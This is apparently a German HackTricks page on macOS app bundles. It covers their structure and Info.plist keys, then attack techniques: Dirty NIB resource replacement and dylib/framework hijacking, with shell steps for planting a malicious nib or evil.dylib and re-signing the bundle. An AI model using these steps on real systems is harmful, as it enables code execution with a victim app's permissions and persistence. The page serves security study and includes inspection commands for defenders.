# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Bundles dienen in macOS als Container für verschiedene Ressourcen, darunter Anwendungen, Bibliotheken und andere erforderliche Dateien. Dadurch erscheinen sie im Finder als einzelne Objekte, beispielsweise die bekannten `*.app`-Dateien. Das am häufigsten anzutreffende Bundle ist das `.app`-Bundle, obwohl auch andere Typen wie `.framework`, `.systemextension` und `.kext` weit verbreitet sind.

### Wesentliche Komponenten eines Bundles

Innerhalb eines Bundles, insbesondere im Verzeichnis `<application>.app/Contents/`, befinden sich verschiedene wichtige Ressourcen:

- **\_CodeSignature**: Dieses Verzeichnis speichert wichtige Informationen zur Codesignatur, die zur Überprüfung der Integrität der Anwendung dienen. Die Informationen zur Codesignatur können mit Befehlen wie den folgenden eingesehen werden:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Enthält die ausführbare Binary der Anwendung, die bei einer Benutzerinteraktion ausgeführt wird.
- **Resources**: Ein Repository für die UI-Komponenten der Anwendung, einschließlich Bildern, Dokumenten und Interface-Beschreibungen (nib/xib-Dateien).
- **Info.plist**: Dient als zentrale Konfigurationsdatei der Anwendung und ist entscheidend dafür, dass das System die Anwendung korrekt erkennt und mit ihr interagiert.

#### Wichtige Schlüssel in Info.plist

Die Datei `Info.plist` ist ein zentraler Bestandteil der Anwendungskonfiguration und enthält unter anderem folgende Schlüssel:

- **CFBundleExecutable**: Gibt den Namen der Haupt-Executable an, die sich im Verzeichnis `Contents/MacOS` befindet.
- **CFBundleIdentifier**: Stellt eine globale Kennung für die Anwendung bereit, die von macOS umfassend für die Anwendungsverwaltung verwendet wird.
- **LSMinimumSystemVersion**: Gibt die minimale macOS-Version an, die für die Ausführung der Anwendung erforderlich ist.

### Bundles untersuchen

Um den Inhalt eines Bundles wie `Safari.app` zu untersuchen, kann folgender Befehl verwendet werden: `bash ls -lR /Applications/Safari.app/Contents`

Diese Untersuchung zeigt Verzeichnisse wie `_CodeSignature`, `MacOS` und `Resources` sowie Dateien wie `Info.plist`. Jedes dieser Elemente erfüllt einen eigenen Zweck – von der Absicherung der Anwendung bis zur Definition ihrer Benutzeroberfläche und Betriebsparameter.

#### Zusätzliche Bundle-Verzeichnisse

Neben den üblichen Verzeichnissen können Bundles auch Folgendes enthalten:

- **Frameworks**: Enthält die von der Anwendung verwendeten gebündelten Frameworks. Frameworks ähneln dylibs, enthalten jedoch zusätzliche Ressourcen.
- **PlugIns**: Ein Verzeichnis für Plug-ins und Erweiterungen, die die Fähigkeiten der Anwendung erweitern.
- **XPCServices**: Enthält von der Anwendung verwendete XPC-Services für die Kommunikation außerhalb des Prozesses.

Diese Struktur stellt sicher, dass alle erforderlichen Komponenten innerhalb des Bundles gekapselt sind, und ermöglicht dadurch eine modulare und sichere Anwendungsumgebung.

Ausführlichere Informationen zu `Info.plist`-Schlüsseln und ihrer Bedeutung bietet die Apple-Entwicklerdokumentation: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Sicherheitshinweise und Abuse Vectors

- **Gatekeeper / App Translocation**: Wenn ein unter Quarantäne stehendes Bundle zum ersten Mal ausgeführt wird, führt macOS eine umfassende Signaturprüfung durch und kann es aus einem zufällig gewählten translozierten Pfad ausführen. Nach der Akzeptierung werden bei späteren Starts nur oberflächliche Prüfungen durchgeführt; Ressourcendateien in `Resources/`, `PlugIns/`, nib-Dateien usw. wurden historisch nicht überprüft. Seit macOS 13 Ventura wird beim ersten Start eine umfassende Prüfung erzwungen, und die neue TCC-Berechtigung *App Management* schränkt Prozesse von Drittanbietern beim Ändern anderer Bundles ohne Zustimmung des Benutzers ein. Ältere Systeme bleiben jedoch anfällig.
- **Bundle Identifier collisions**: Mehrere eingebettete Targets (PlugIns, Helper-Tools), die dieselbe `CFBundleIdentifier` wiederverwenden, können die Signaturvalidierung beeinträchtigen und gelegentlich URL-Scheme-Hijacking oder Verwechslungen ermöglichen. Sub-Bundles sollten immer aufgelistet und eindeutige IDs überprüft werden.

## Resource Hijacking (Dirty NIB / NIB Injection)

Vor Ventura konnte das Austauschen von UI-Ressourcen in einer signierten Anwendung die oberflächliche Code-Signing-Prüfung umgehen und Code Execution mit den Entitlements der Anwendung ermöglichen. Aktuelle Forschung (2024) zeigt, dass dies auf Systemen vor Ventura und bei nicht unter Quarantäne stehenden Builds weiterhin funktioniert:<sup>[[1]](#references)[[2]](#references)</sup>

1. Die Zielanwendung an einen beschreibbaren Ort kopieren (z. B. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` (oder eine beliebige in `NSMainNibFile` deklarierte nib-Datei) durch eine bösartige Datei ersetzen, die `NSAppleScript`, `NSTask` usw. instanziiert.
3. Die Anwendung starten. Die bösartige nib-Datei wird unter der Bundle-ID und mit den Entitlements des Opfers ausgeführt (TCC-Berechtigungen, Mikrofon/Kamera usw.).
4. Ventura+ wirkt dem entgegen, indem das Bundle beim ersten Start umfassend überprüft wird und für spätere Änderungen die Berechtigung *App Management* erforderlich ist. Dadurch wird Persistence erschwert, Angriffe beim ersten Start auf älteren macOS-Versionen sind jedoch weiterhin möglich.<sup>[[1]](#references)</sup>

Minimales Beispiel für eine bösartige nib-Payload (xib mit `ibtool` in nib kompilieren):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking in Bundles

Da `@rpath`-Lookups gebündelte Frameworks/PlugIns bevorzugen, kann das Ablegen einer bösartigen Library innerhalb von `Contents/Frameworks/` oder `Contents/PlugIns/` die Lade-Reihenfolge umleiten, wenn das Haupt-Binary ohne Library Validation oder mit einer schwachen `LC_RPATH`-Reihenfolge signiert wurde.

Typische Schritte beim Ausnutzen eines unsignierten/ad-hoc-Bundles:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Hinweise:
- Eine Hardened runtime ohne `com.apple.security.cs.disable-library-validation` blockiert Third-party dylibs; prüfe zuerst die entitlements.
- XPC services unter `Contents/XPCServices/` laden häufig sibling frameworks – patche ihre Binaries auf ähnliche Weise für Persistence- oder Privilege-Escalation-Pfade.

## Kurzübersicht zur Inspektion
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referenzen

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
